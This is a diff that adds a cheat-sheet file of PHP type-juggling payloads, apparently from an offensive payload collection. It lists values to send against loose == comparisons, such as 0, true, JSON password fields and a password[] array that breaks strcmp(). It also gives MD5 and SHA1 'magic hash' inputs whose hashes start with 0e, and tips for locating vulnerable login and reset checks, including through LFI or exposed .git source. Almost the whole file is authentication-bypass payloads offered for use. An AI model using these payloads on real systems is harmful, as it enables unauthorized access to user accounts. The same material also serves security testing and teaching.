@@ -1,0 +1,29 @@
+# Type juggling & magic hashes (PHP loose compare: == / !=)
+#
+# Why: in PHP, '0e123' == '0e456' is TRUE (both parse to 0.0), and 0 == 'abc' can be
+# TRUE on old versions. If a password/token/hash is compared with == (not ===), these win.
+
+## Direct loose-compare bypasses (send as the value where a string is expected)
+0            # 0 == "any-non-numeric-string" on PHP < 8
+true         # true == "anything non-empty"
+# JSON body into a == check:
+{"password":0}
+{"password":true}
+# Array to break strcmp()/hash funcs -> NULL, NULL == 0 -> bypass:
+password[]=1
+
+## "Magic" hashes — string whose hash is 0e<digits> (compares equal to another 0e-hash)
+# If the app does  md5($input) == $stored  and $stored is also a 0e-hash, any of these matches.
+# MD5 (hash is 0e...):
+240610708        -> 0e462097431906509019562988736854
+QNKCDZO          -> 0e830400451993494058024219903391
+aabg7XSs         -> 0e087386482136013740957780965295
+# SHA1 (0e...):
+10932435112      -> 0e07766915004133176347055865026311692244
+# Plain known collisions people reuse:
+# "md5(240610708)" and "md5(QNKCDZO)" both start 0e -> compare equal to each other.
+
+## How to spot it
+# - Login/reset compares a hash with == and you control the compared value, or
+# - Two different inputs are accepted interchangeably, or
+# - Source (via LFI/.git) shows strcmp()/== on secrets.
